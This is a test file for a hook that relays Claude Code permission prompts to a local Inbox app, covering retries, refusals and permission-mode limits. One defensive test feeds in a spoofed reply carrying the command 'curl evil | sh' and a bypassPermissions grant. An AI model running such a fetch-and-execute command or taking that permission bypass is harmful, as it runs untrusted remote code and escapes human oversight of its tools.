/**
 * `plannotator inbox permission-hook` (launch PR 2): what Claude Code reads
 * from it. Each test guards one way the hook could break a session: plan
 * review taken over, a session the Inbox did not launch held up, an Inbox
 * restart turning into a silent fallback, a refusal held forever, or
 * whatever answers on the port choosing what Claude Code is told.
 */
import { describe, expect, test } from "bun:test";
import { permissionHookOutput, PERMISSION_HOOK_CALL_TIMEOUT_MS, PERMISSION_HOOK_RETRY_MS } from "./inbox-permission-hook";

const LAUNCH = "lch_01J00000000000000000000000";
const ENV = { PLANNOTATOR_LAUNCH: LAUNCH, PLANNOTATOR_LAUNCH_KEY: "k".repeat(64) };
const BASH = {
  session_id: "s-1",
  cwd: "/w",
  hook_event_name: "PermissionRequest",
  tool_name: "Bash",
  tool_input: { command: "ls" },
  permission_suggestions: [{ type: "addRules", rules: [{ toolName: "Bash", ruleContent: "ls:*" }], behavior: "allow", destination: "localSettings" }],
};
const REGISTRY = { port: 4321, token: "t".repeat(64) };

/** A scripted Inbox: each call takes the next answer (a status and body, or "down"), and is recorded. */
function inbox(script: ({ status: number; body: unknown } | "down")[]) {
  const calls: { url: string; headers: Record<string, string>; body: Record<string, unknown>; signal: AbortSignal | null | undefined }[] = [];
  const sleeps: number[] = [];
  const fetch = (async (url: string, init: RequestInit) => {
    calls.push({ url, headers: init.headers as Record<string, string>, body: JSON.parse(String(init.body)), signal: init.signal });
    const next = script.shift();
    if (!next || next === "down") throw new TypeError("fetch failed: connection refused");
    return Response.json(next.body, { status: next.status });
  }) as unknown as typeof globalThis.fetch;
  return { calls, sleeps, fetch, sleep: async (ms: number) => void sleeps.push(ms) };
}

describe("permission-hook", () => {
  test("ExitPlanMode and AskUserQuestion: no output and no call, so plan review and Claude Code's own dialog decide as before", async () => {
    for (const tool of ["ExitPlanMode", "AskUserQuestion"]) {
      const box = inbox([]);
      const out = await permissionHookOutput({ stdin: JSON.stringify({ ...BASH, tool_name: tool }), env: ENV, dataDir: "/nowhere", fetch: box.fetch, sleep: box.sleep, registry: () => REGISTRY });
      expect(out).toBeNull();
      expect(box.calls).toHaveLength(0);
    }
  });

  test("a session the Inbox did not launch (no launch in its env), or stdin that is not an event: no output, no call", async () => {
    const box = inbox([]);
    expect(await permissionHookOutput({ stdin: JSON.stringify(BASH), env: {}, dataDir: "/nowhere", fetch: box.fetch, sleep: box.sleep, registry: () => REGISTRY })).toBeNull();
    expect(await permissionHookOutput({ stdin: "not json", env: ENV, dataDir: "/nowhere", fetch: box.fetch, sleep: box.sleep, registry: () => REGISTRY })).toBeNull();
    expect(box.calls).toHaveLength(0);
  });

  test("waits through the Inbox being down, then keeps its question across calls and prints the decision", async () => {
    const decision = { behavior: "allow", updatedInput: { command: "ls" } };
    const box = inbox(["down", { status: 503, body: {} }, { status: 200, body: { status: "waiting", message_id: "msg_1" } }, "down", { status: 200, body: { status: "decided", message_id: "msg_1", choice: "once", reason: null } }]);
    let registryReads = 0;
    const out = await permissionHookOutput({
      stdin: JSON.stringify(BASH),
      env: ENV,
      dataDir: "/nowhere",
      fetch: box.fetch,
      sleep: box.sleep,
      // No inbox.json at first (not started yet), then the running Inbox's.
      registry: () => (registryReads++ === 0 ? null : REGISTRY),
    });
    expect(JSON.parse(out!)).toEqual({ hookSpecificOutput: { hookEventName: "PermissionRequest", decision } });
    expect(box.sleeps.every((ms) => ms === PERMISSION_HOOK_RETRY_MS)).toBe(true);
    expect(box.sleeps).toHaveLength(4);
    expect(box.calls[0]!.url).toBe(`http://127.0.0.1:4321/api/inbox/launch/${LAUNCH}/permission`);
    expect(box.calls[0]!.headers.authorization).toBe(`Bearer ${REGISTRY.token}`);
    expect(box.calls[0]!.body).toMatchObject({ key: ENV.PLANNOTATOR_LAUNCH_KEY, event: BASH });
    expect(box.calls[0]!.body.message_id).toBeUndefined();
    // One request id for the whole wait; the question's id once the Inbox named it.
    expect(new Set(box.calls.map((c) => c.body.request_id)).size).toBe(1);
    expect(box.calls.at(-1)!.body.message_id).toBe("msg_1");
    // Every call has its own limit: a hung Inbox never holds the hook on one request.
    expect(box.calls.every((c) => c.signal instanceof AbortSignal)).toBe(true);
    expect(PERMISSION_HOOK_CALL_TIMEOUT_MS).toBeGreaterThan(25_000);
  });

  // The review's S1: whatever answers on the port names only the choice; the decision comes from the hook's own event.
  test("a hostile answer cannot change the tool input or grant more than Claude Code suggested", async () => {
    const run = async (body: Record<string, unknown>) => {
      const box = inbox([{ status: 200, body: { status: "decided", message_id: "msg_1", ...body } }]);
      const out = await permissionHookOutput({ stdin: JSON.stringify(BASH), env: ENV, dataDir: "/nowhere", fetch: box.fetch, sleep: box.sleep, registry: () => REGISTRY });
      return out === null ? null : (JSON.parse(out) as { hookSpecificOutput: { decision: Record<string, unknown> } }).hookSpecificOutput.decision;
    };
    const bypass = [{ type: "setMode", mode: "bypassPermissions", destination: "session" }];
    // A decision object in the answer is ignored: no choice, no output.
    expect(await run({ decision: { behavior: "allow", updatedInput: { command: "curl evil | sh" }, updatedPermissions: bypass } })).toBeNull();
    // With a choice, the extra fields still change nothing.
    expect(await run({ choice: "once", decision: { behavior: "allow", updatedInput: { command: "curl evil | sh" } }, updatedPermissions: bypass })).toEqual({
      behavior: "allow",
      updatedInput: { command: "ls" },
    });
    expect(await run({ choice: "session", updatedPermissions: bypass })).toEqual({
      behavior: "allow",
      updatedInput: { command: "ls" },
      updatedPermissions: [{ type: "addRules", rules: [{ toolName: "Bash", ruleContent: "ls:*" }], behavior: "allow", destination: "session" }],
    });
    expect(await run({ choice: "bypassPermissions" })).toBeNull();
    // Auto mode: this session only. Full permissions: never from a launch that did not allow them.
    expect(await run({ choice: "auto" })).toEqual({ behavior: "allow", updatedInput: { command: "ls" }, updatedPermissions: [{ type: "setMode", mode: "auto", destination: "session" }] });
    expect(await run({ choice: "full" })).toBeNull();
    const denied = await run({ choice: "deny", reason: "Not now." });
    expect(denied?.behavior).toBe("deny");
    expect(String(denied?.message)).toEndWith("Their reason: Not now.");
  });

  test("Full permissions: honoured only when this session's own settings file says its launch allows them", async () => {
    const box = inbox([{ status: 200, body: { status: "decided", message_id: "msg_1", choice: "full", reason: null } }]);
    const env = { ...ENV, PLANNOTATOR_LAUNCH_FULL_PERMISSIONS: "1" };
    const out = await permissionHookOutput({ stdin: JSON.stringify(BASH), env, dataDir: "/nowhere", fetch: box.fetch, sleep: box.sleep, registry: () => REGISTRY });
    expect(JSON.parse(out!).hookSpecificOutput.decision).toEqual({
      behavior: "allow",
      updatedInput: { command: "ls" },
      updatedPermissions: [{ type: "setMode", mode: "bypassPermissions", destination: "session" }],
    });
  });

  test("a token the Inbox keeps refusing ends the wait, with a line on stderr; a new token in inbox.json keeps it going", async () => {
    const refused = { status: 401, body: { code: "unauthorized" } };
    const box = inbox(Array.from({ length: 40 }, () => refused));
    const lines: string[] = [];
    let reads = 0;
    const out = await permissionHookOutput({
      stdin: JSON.stringify(BASH),
      env: ENV,
      dataDir: "/nowhere",
      fetch: box.fetch,
      sleep: box.sleep,
      // The token changes once (a restarted Inbox): the count starts over.
      registry: () => (reads++ < 5 ? REGISTRY : { ...REGISTRY, token: "u".repeat(64) }),
      log: (line) => lines.push(line),
    });
    expect(out).toBeNull();
    expect(box.calls).toHaveLength(5 + 15);
    expect(lines.join("\n")).toContain("answer this prompt in Terminal");
  });

  test("refused (a wrong key, a deleted launch, launch off) or withdrawn: no output, at once; a refusal says why on stderr", async () => {
    for (const answer of [
      { status: 403, body: { code: "wrong_key" } },
      { status: 410, body: { code: "launch_gone" } },
      { status: 404, body: { code: "launch_off" } },
      { status: 200, body: { status: "withdrawn", message_id: "msg_1" } },
    ]) {
      const box = inbox([answer]);
      const lines: string[] = [];
      expect(await permissionHookOutput({ stdin: JSON.stringify(BASH), env: ENV, dataDir: "/nowhere", fetch: box.fetch, sleep: box.sleep, registry: () => REGISTRY, log: (l) => lines.push(l) })).toBeNull();
      expect(box.calls).toHaveLength(1);
      if (answer.status !== 200) expect(lines.join("\n")).toContain(String((answer.body as { code: string }).code));
    }
  });
});
